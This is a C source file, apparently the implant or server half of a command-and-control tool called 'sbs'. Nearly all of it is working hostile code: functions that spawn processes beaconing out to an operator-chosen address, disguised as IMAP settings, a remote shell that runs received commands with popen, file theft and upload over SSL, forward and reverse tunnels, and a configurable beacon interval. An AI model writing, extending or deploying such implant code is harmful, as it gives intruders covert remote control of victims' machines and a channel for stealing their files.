#include "server.h"

/** 
 * Spin up a new child daemon that immediately beacons out to the indicated address
 * and port. When the primary client abandons the sessions all sub sessions will be killed.
 * On socket errors the server will revert to beaconing behavior.
 * 
 * Note: Currently the method in which we kick off the binary relies on the name of the binary
 * being 'sbs' and this binary being in the path. The binary must also be on disk in order to 
 * kick off. Future versions may offer variations on how to establish a new connection.
 */
int newconn(SSL *ssl, pid_t *pids) {
  FILE *fp;
  pid_t pid;
  char *env;
  char *pidstr;
  char port[7];
  char addr[INET6_ADDRSTRLEN];
  uint8_t buf[4096] = {0};

  if (ssl_writeall(ssl, (uint8_t *)"100", 4) < 0) {return FAIL;}
  if (ssl_readall(ssl, (uint8_t *)addr, sizeof(addr)) < 0) {return FAIL;}
  if (ssl_writeall(ssl, (uint8_t *)"101", 4) < 0) {return FAIL;}
  if (ssl_readall(ssl, (uint8_t *)port, sizeof(port)) < 0) {return FAIL;}
  if (ssl_writeall(ssl, (uint8_t *)"102", 4) < 0) {return FAIL;}

  pid = fork();
  if (pid == -1) {
    if (ssl_writeall(ssl, (uint8_t *)"-1", 3) < 0) {return FAIL;}
  } else if (pid == 0) {
    setenv("IMAP_SERVER", addr, 1);
    setenv("IMAP_PORT", port, 1);
    env = getenv("PATH");
    strncpy((char *)buf, env, sizeof(buf)-1);
    sprintf((char *)buf + strlen((char *)buf), ":.");
    setenv("PATH", (char *)buf, 1);
    execlp("sbs", "sbs", (char*)NULL);
  } else {
    memset(buf, 0, sizeof(buf));
    fp = popen("pidof sbs", "r");
    fgets((char *)buf, sizeof(buf), fp);
    pidstr = strtok((char *)buf, " ");
    if (ssl_writeall(ssl, (uint8_t *)pidstr, 16) < 0) {
      // Do nothing so that we can still get the pids
    }
    for (size_t i = 0; i < 64; i++) {
      if (pids[i] == 0) {
        pids[i] = atoi(pidstr);
        break;
      }
    }
  }

  return SUCCESS;
}

/**
 * Current implementation opens a 'shell' by running a command via popen and then
 * returning the results. Future version will allow the user to have access to a pty
 * enabling interactive commands such as vim and top to be run on the target machine.
 * On socket errors the program will revert to beaconing behavior.
 */
int cmdshell(SSL *ssl) {
  FILE *fp;
  uint8_t buf[4096] = {0};

  fp = popen("date", "r");
  while (fgets((char *)buf, sizeof(buf), fp) != NULL) {
    if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {
      pclose(fp);
      return FAIL;
    }
  }
  pclose(fp);

  memset(buf, 0, sizeof(buf));
  while(ssl_readall(ssl, buf, sizeof(buf)) > 0) {
    fp = NULL;
    if (strcmp((char *)buf, "exit\n") == 0) {
      return RECOVER;
    }

    if ((fp = popen((char *)buf, "r")) == NULL) {
      if (ssl_writeall(ssl, (uint8_t *)"101", 4) < 0) {return FAIL;}
      continue;
    }

    while(1) {
      if (fgets((char *)buf, sizeof(buf), fp) == NULL && strlen((char *)buf) == 0) {
        if (ssl_writeall(ssl, (uint8_t *)"101", 4) < 0) {return FAIL;}
        break;
      }
      if (ssl_writeall(ssl, (uint8_t *)"102", 4) < 0) {return FAIL;}
      if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}

      memset(buf, 0, sizeof(buf));
    }

    memset(buf, 0, sizeof(buf));
    pclose(fp);
  }
  
  return SUCCESS;
}

/**
 * Sends a file from the server to the requesting client.
 * On ssl socket errors the program will revert to beaconing behavior.
 */
int getfile(SSL *ssl) {
  FILE *fd;
  uint8_t ans[256] = {0};
  uint8_t buf[4096] = {0};
  ssize_t filesize = 0;
  size_t readin = 0;
  struct stat st;

  // Tell the client we are good to begin the process
  if (ssl_writeall(ssl, (uint8_t *)"300", 4) < 0) {return FAIL;}

  // Recieve the name of the file that the client would like
  if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}

  // Ensure we can open the file that is being asked for
  if((fd = fopen((char *)buf, "r")) == NULL) {
    if (ssl_writeall(ssl, (uint8_t *)"-1", 3) < 0) {return FAIL;}
    return RECOVER;
  }

  // Get the file size and then rewind to the begining of the file
  fstat(fileno(fd), &st);
  filesize = st.st_size;
  sprintf((char *)ans, "%ld", filesize);
  if (ssl_writeall(ssl, ans, sizeof(ans)) < 0) {goto failure;}

  // Send the file
  while(readin < (size_t)filesize) {
    memset(buf, 0, sizeof(buf));
    fgets((char *)buf, sizeof(buf), fd);
    readin += strlen((char *)buf);
    if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {goto failure;}
  }

  fclose(fd);
  return SUCCESS;

  failure:
  fclose(fd);
  return FAIL;
}

/**
 * Recieve a file from the client.
 * On ssl socket errors the program will revert to beaconing behavior.
 */
int putfile(SSL *ssl) {
  FILE *fd;
  uint8_t ans[256] = {0};
  uint8_t buf[4096] = {0};
  ssize_t filesize = 0;
  size_t written = 0;

  // Tell the client we are good to begin the process
  if (ssl_writeall(ssl, (uint8_t *)"400", 4) < 0) {return FAIL;}

  // Recieve the name of the file that the client would like
  if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}

  // Ensure we can open the file that is being asked for
  if((fd = fopen((char *)buf, "a")) == NULL) {
    if(ssl_writeall(ssl, (uint8_t *)"-1", 3) < 0) {return FAIL;}
    return RECOVER;
  }

  if (ssl_writeall(ssl, (uint8_t *)"401", 4) < 0) {goto failure;}

  // Recieve the filesize from the client
  if (ssl_readall(ssl, ans, sizeof(ans)) < 0) {goto failure;}
  filesize = atoi((char *)ans);
  if (filesize < 1) {
    return RECOVER;
  };

  // Download the file
  while(written < (size_t)filesize) {
    if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {goto failure;}
    fprintf(fd, "%s", buf);
    written += strlen((char *)buf);
    memset(buf, 0, sizeof(buf));
  }
  fclose(fd);

  return SUCCESS;

  failure:
  fclose(fd);
  return FAIL;
}

/**
 * Determine what the client wants to setup -- either a forward or reverse tunnel.
 * The server will remain in this mode until the client indicates that the user has 
 * shutdown the tunnel, or it detects a read/write error on either of the sockets. In the 
 * event of a socket error while in the loop the server will revert to its beaconing behavior.
 */
int tunnel(SSL *ssl) {
  int efd;
  uint8_t ans[4] = {0};

  // Set the epoll file descriptor
  if ((efd = epoll_create1(0)) < 0) {
    if (ssl_writeall(ssl, (uint8_t *)"530", 4) < 0) {return FAIL;}
    return FAIL;
  }

  // Tell the client we are good to begin the process
  if (ssl_writeall(ssl, (uint8_t *)"500", 4) < 0) {return FAIL;}

  // Determine if the client wants to setup a forward or reverse tunnel
  if (ssl_readall(ssl, ans, 3) < 0) {return FAIL;}

  // First branch is a forward tunnel
  if (strcmp((char *)ans, "51") == 0) { 
    return forward_tunnel(ssl, efd);
  }
  // Second branch is a reverse tunnel 
  else if (strcmp((char *)ans, "52") == 0) {
    return reverse_tunnel(ssl, efd);
  } 
  // We should not hit this but if we do send an error message and recover back to waiting for a new command
  else { 
    if (ssl_writeall(ssl, (uint8_t *)"535", 4) < 0) {return FAIL;}
    return RECOVER;
  }

  // We shouldn't make it here naturally so attempt to recover
  return RECOVER;
}

/**
 * Set the time to sleep between each beacon the server will send. On error revert to the
 * beaconing behavior that was previously set.
 */
int winset(SSL *ssl, int *time) {
  uint8_t ans[256] = {0};

  if (ssl_writeall(ssl, (uint8_t *)"600", 4) < 0) {return FAIL;}
  if (ssl_readall(ssl, (uint8_t *)ans, sizeof(ans)) < 0) {return FAIL;}
  if (ssl_writeall(ssl, (uint8_t *)"601", 4) < 0) {return FAIL;}

  *time = atoi((char *)ans);

  return SUCCESS;
}
